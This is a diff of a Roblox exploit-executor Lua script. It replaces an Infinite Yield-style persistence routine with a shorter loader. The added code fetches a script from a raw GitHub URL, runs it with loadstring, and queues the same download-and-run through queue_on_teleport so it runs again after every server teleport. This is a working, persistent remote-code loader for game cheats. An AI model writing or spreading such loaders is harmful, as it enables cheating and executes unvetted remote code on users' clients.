@@ -1,78 +1,13 @@
--- Persistent self-executing script using Infinite Yield's exact queueteleport fallback + OnTeleport pattern
--- Run this ONCE — it will keep re-queuing and re-attaching forever
+wait(6)
 
--- ───────────────────────────────────────────────
--- IY's exact missing() function + fallback chain
--- ───────────────────────────────────────────────
+local scriptUrl = "https://raw.githubusercontent.com/losermancracker-byte/scripts/refs/heads/main/bundle%20ak%20hexlust"
 
-local function missing(t, f, fallback)
-	if type(f) == t then return f end
-	return fallback
-end
+local scriptCode = game:HttpGet(scriptUrl)
+loadstring(scriptCode)()
 
-local queueteleport = missing("function", queue_on_teleport, 
-    missing("function", syn and syn.queue_on_teleport, 
-        missing("function", fluxus and fluxus.queue_on_teleport, nil)
-    )
-)
-
--- Your loadstring URL + delay
-local YOUR_URL = "https://raw.githubusercontent.com/losermancracker-byte/scripts/refs/heads/main/bundle%20ak%20hexlust"
-local DELAY = 6
-
--- Flag to prevent duplicate queuing in same session
-local alreadyQueued = false
-
--- IY-style OnTeleport persistence
-game.Players.LocalPlayer.OnTeleport:Connect(function(state)
-    if alreadyQueued then return end
-    alreadyQueued = true
-
-    if queueteleport then
-        -- Queue OURSELVES again (minimal version that re-attaches + runs)
-        queueteleport([[
-            local alreadyQueued = false
-            game.Players.LocalPlayer.OnTeleport:Connect(function(s)
-                if alreadyQueued then return end
-                alreadyQueued = true
-                
-                if queueteleport then
-                    queueteleport("task.delay(6, function() pcall(function() loadstring(game:HttpGet(']] .. YOUR_URL .. [[', true))() end) end)")
-                end
-            end)
-            
-            -- Run in this new server after delay
-            task.delay(]] .. DELAY .. [[, function()
-                pcall(function()
-                    loadstring(game:HttpGet(']] .. YOUR_URL .. [[', true))()
-                end)
-            end)
-        ]])
-        
-        print("[HexAuto] Re-queued for next server using IY pattern")
-    else
-        print("[HexAuto] No queueteleport support detected")
-    end
-end)
-
--- Run in current server after delay
-task.delay(DELAY, function()
-    pcall(function()
-        loadstring(game:HttpGet(YOUR_URL, true))()
-    end)
-    print("[HexAuto] Executed in current server after " .. DELAY .. " seconds")
-end)
-
--- Extra initial queue (safety layer)
-if queueteleport then
-    queueteleport([[
-        task.delay(]] .. DELAY .. [[, function()
-            pcall(function()
-                loadstring(game:HttpGet("]] .. YOUR_URL .. [[", true))()
-            end)
-        end)
+if queue_on_teleport then
+    queue_on_teleport([[
+        task.wait(6)   -- or wait(6) if your exploit still prefers the old name
+        loadstring(game:HttpGet("]] .. scriptUrl .. [["))()
     ]])
-    print("[HexAuto] Added extra initial queue")
 end
-
-print("[HexAuto] Setup complete — should now persist across rejoins like Infinite Yield")
